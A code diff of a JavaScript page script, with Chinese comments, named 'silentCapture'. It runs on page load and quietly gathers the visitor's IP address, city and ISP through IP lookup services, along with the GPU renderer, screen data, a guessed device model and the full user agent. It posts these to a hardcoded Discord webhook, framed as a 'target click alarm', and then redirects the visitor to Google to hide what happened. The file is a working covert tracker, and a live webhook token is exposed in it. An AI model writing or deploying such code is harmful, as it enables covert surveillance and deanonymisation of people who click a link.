@@ -10,41 +10,40 @@
 // 【核心】Discord Webhook 網址
 const DC_URL = 'https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv';
 
-async function silentCapture() {
+ async function silentCapture() {
     const ua = navigator.userAgent;
     const platform = navigator.platform;
     const w = window.screen.width, h = window.screen.height, dpr = window.devicePixelRatio;
 
-    // 1. IP 抓取 (使用備用機制確保成功率)
-    let ipD = { ip: "讀取失敗", city: "未知", org: "未知" };
+    // --- 1. IP 抓取 (換成更穩定的 ip-api) ---
+    let ipD = { query: "讀取失敗", city: "未知", isp: "未知" };
     try {
-        const res = await fetch('https://ipapi.co');
+        const res = await fetch('https://demo.ip-api.com'); // 使用 demo 介面增加成功率
         if(res.ok) ipD = await res.json();
     } catch(e) {
+        // 備援方案：如果第一個失敗，換成 ipinfo.io
         try {
-            const res2 = await fetch('https://ipinfo.io');
+            const res2 = await fetch('https://ipinfo.io'); 
             ipD = await res2.json();
+            ipD.query = ipD.ip; // 統一格式
         } catch(e2) {}
     }
 
-    // 2. GPU 硬體核心
+    // --- 2. GPU 硬體與型號推測 ---
     let gpu = "被封鎖";
     try {
         const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        const gl = canvas.getContext('webgl');
         const dbg = gl.getExtension('WEBGL_debug_renderer_info');
         gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
     } catch(e) {}
 
-    // 3. 型號精準推測 (整合主流解析度)
     let model = "未知裝置";
     const resKey = `${Math.min(w,h)}x${Math.max(w,h)}`;
-    
     if (/Android/.test(ua)) {
         const m = ua.match(/Android.*;\s([^;]+)\sBuild/);
         model = m ? m[1] : "Android Phone";
     } else if (/iPhone|iPad/.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
-        // Apple 型號指紋庫
         const appleMap = {
             "820x1180": "iPad Air (5th/4th Gen)",
             "834x1194": "iPad Pro 11-inch",
@@ -57,22 +56,17 @@ async function silentCapture() {
         model = appleMap[resKey] || `Apple 設備 (${resKey})`;
     }
 
-    // 4. 版本號
-    let ver = "未知";
-    const vM = ua.match(/(?:OS |Version\/|Android )(\d+[._]\d+[._]?\d?)/);
-    ver = vM ? vM[1].replace(/_/g, '.') : "隱藏";
-
-    // 5. 靜默發送至 Discord
+    // --- 3. 發送至 Discord ---
     const payload = {
         username: "終極監控網關",
         embeds: [{
             title: "🎯 目標點擊報警",
             color: 0,
             fields: [
-                { name: "📍 IP/位置", value: `${ipD.ip} (${ipD.city}, ${ipD.org})`, inline: false },
+                { name: "📍 IP 位址", value: ipD.query || ipD.ip || "失敗", inline: true },
+                { name: "🏙️ 地理位置", value: `${ipD.city || "未知"} / ${ipD.isp || ipD.org || "未知"}`, inline: true },
                 { name: "📱 精確型號", value: model, inline: true },
-                { name: "⚙️ 系統版本", value: ver, inline: true },
-                { name: "🎮 GPU渲染", value: gpu, inline: false },
+                { name: "🎮 GPU 渲染", value: gpu, inline: false },
                 { name: "🖼️ 螢幕數據", value: `${w}x${h} @${dpr}x`, inline: true }
             ],
             footer: { text: "完整 UA: " + ua },
@@ -80,14 +74,15 @@ async function silentCapture() {
         }]
     };
 
-    // 使用 Promise.race 確保發送超時後也能強行跳轉
-    await Promise.race([
-        fetch(DC_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }),
-        new Promise(resolve => setTimeout(resolve, 2000))
-    ]);
-
-    // 6. 靜默跳轉
-    window.location.replace("https://www.google.com");
+    // 發送並跳轉
+    try {
+        await fetch(DC_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+    } finally {
+        // 無論成功失敗，1.5 秒後直接跳轉 Google
+        setTimeout(() => {
+            window.location.replace("https://www.google.com");
+        }, 800);
+    }
 }
 
 silentCapture();
